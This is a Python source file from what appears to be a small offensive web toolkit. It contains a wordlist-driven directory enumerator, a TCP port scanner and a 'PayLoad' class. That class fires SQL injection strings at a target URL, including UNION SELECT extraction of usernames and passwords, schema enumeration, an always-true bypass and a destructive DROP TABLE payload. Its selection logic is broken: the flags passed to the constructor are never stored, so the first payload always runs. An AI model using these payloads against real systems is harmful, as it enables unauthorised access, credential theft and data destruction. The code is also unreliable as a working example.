import requests
import socket
import os

from direnumerate.createlist import create_wordlist
from direnumerate.colors import Color


class DirScan():
    def __init__(self, url, wordlist_file):
        self.url = "http://" + url
        self.wordlist_file = wordlist_file

    def dir_enum(self):
        try:
            with open(self.wordlist_file, "r") as self.wordlist_file:
                for line in self.wordlist_file:
                    path = line.strip()
                    full_url = self.url + "/" + path
                    response = requests.get(full_url)
                    
                    if response.status_code == 200:
                        print(Color.GREEN + f"Target access [Found]: -> {Color.RESET + full_url}")
                    elif response.status_code == 204:
                        print(Color.BLUE + f"Target access [No Content]: -> {Color.RESET+ full_url}")
                    elif response.status_code == 400:
                        print(Color.YELLOW + f"Target access [Bad Request]: -> {Color.RESET+ full_url}")
                    elif response.status_code == 401:
                        print(Color.RED + f"Target access [Unauthorized]: -> {Color.RESET+ full_url}")
                    elif response.status_code == 403:
                        print(Color.RED + f"Target access [Forbidden]: -> {Color.RESET+ full_url}")
                    elif response.status_code == 404:
                        print(Color.YELLOW + f"Target access [Not Found]: -> {Color.RESET+ full_url}")
                    elif response.status_code == 500:
                        print(Color.BLUE + f"Target access [Internal Server Error]: -> {Color.RESET+ full_url}")
        except FileNotFoundError:
            if not os.path.isfile(self.wordlist_file):
                create_wordlist(self.wordlist_file)
            print("Word list file not found.")
            
        except TypeError:
            print(Color.GREEN + "-------------------- Scan Finished --------------------" + Color.RESET)
            
        except KeyboardInterrupt:
            print(Color.GREEN + "-------------- attempt interrupted by user ------------" + Color.RESET)

        if not os.path.isfile(self.wordlist_file):
            create_wordlist(self.wordlist_file)


class PortScan:
    def __init__(self, host, ports):
        self.host = host
        self.ports = ports
        self.open_ports = []

    def scan_ports(self):
        for port in self.ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            result = sock.connect_ex((self.host, port))

            if result == 0:
                self.open_ports.append(port)
                print(Color.GREEN + f"Target -> [http://{self.host}] port: {port} is open" + Color.RESET)
            else:
                print(Color.RED + f"Target -> [http://{self.host}] port: {port} is closed" + Color.RESET)
            sock.close()

class PayLoad:
    def __init__(self, 
                 url, 
                 rocket1: bool = False,
                 rocket2: bool = False,
                 rocket3: bool = False,
                 rocket4: bool = False,
                 rocket5: bool = False,
                 rocket6: bool = False,
                 rocket7: bool = False,
                 rocket8: bool = False,
                 rocket9: bool = False,):

                 self.url = url
        
    def start_inject(self):
        """rocket launcher"""

        rocket1 = {
            'termo': "' UNION SELECT username, password FROM users --"
        }

        rocket2 = {
            'termo': "' UNION SELECT table_name, NULL FROM information_schema.tables --"
        }

        rocket3 = {
            'termo': "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'tablename' --"
        }

        rocket4 = {
            'termo': "' UNION SELECT field1, field2 FROM tablename --"
        }

        rocket5 = {
            'termo': "' OR 'a'='a --"
        }

        rocket6 = {
            'termo': "' UNION SELECT user(), NULL --"
        }

        rocket7 = {
            'termo': "' UNION SELECT @@hostname, NULL --"
        }

        rocket8 = {
            'termo': "' UNION SELECT user(), NULL --"
        }

        rocket9 = {
            'termo': "' ; DROP TABLE nome_da_tabela --"
        }

        if rocket1:
            response = requests.get(self.url, params=rocket1)
            pass
        elif rocket2:
            response = requests.get(self.url, params=rocket2)
            pass
        elif rocket3:
            response = requests.get(self.url, params=rocket3)
            pass
        elif rocket4:
            response = requests.get(self.url, params=rocket4)
            pass
        elif rocket5:
            response = requests.get(self.url, params=rocket5)
            pass
        elif rocket6:
            response = requests.get(self.url, params=rocket6)
            pass
        elif rocket7:
            response = requests.get(self.url, params=rocket7)
            pass
        elif rocket8:
            response = requests.get(self.url, params=rocket8)
            pass
        elif rocket9:
            response = requests.get(self.url, params=rocket9)
            pass

        if "search results" in response.text:
            print(Color.RED + "SQL injection performed successfully!" + Color.RESET)
   
            print(response.text)
        else:
            print(Color.GREEN + "SQL injection didn't work." + Color.RESET)
